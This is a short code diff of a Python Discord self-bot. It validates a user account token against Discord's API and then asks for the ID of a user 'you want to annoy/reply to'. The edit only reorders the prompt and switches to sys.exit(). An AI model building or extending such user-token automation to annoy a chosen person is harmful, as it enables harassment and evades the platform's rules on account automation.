@@ -2,6 +2,7 @@ import discord
 import json
 import requests
 import os
+import sys  # Import the sys module for exit()
 
 # Ensure the 'download' directory exists
 if not os.path.exists('download'):
@@ -12,16 +13,16 @@ token = 'yourtokenhere'
 
 os.system('cls')
 
-# Prompt the user for their Discord user ID
-user = input("Enter the Discord ID of the user u want to annoy/reply to: ")
-
 header = {'authorization': token, 'x-super-properties': 'YOUR_SUPER_PROPERTIES_HERE'}
 
 check_token = requests.get('https://discord.com/api/v9/users/@me', headers=header)
 
 if check_token.status_code != 200:
     print('Invalid token, check config')
-    exit()
+    sys.exit()  # Exit the script if the token is invalid
+
+# Prompt the user for their Discord user ID
+user = input("Enter the Discord ID of the user you want to annoy/reply to: ")
 
 check_user = requests.get(f'https://discord.com/api/v9/users/{user}', headers=header)
 check_user_response = json.loads(check_user.text)
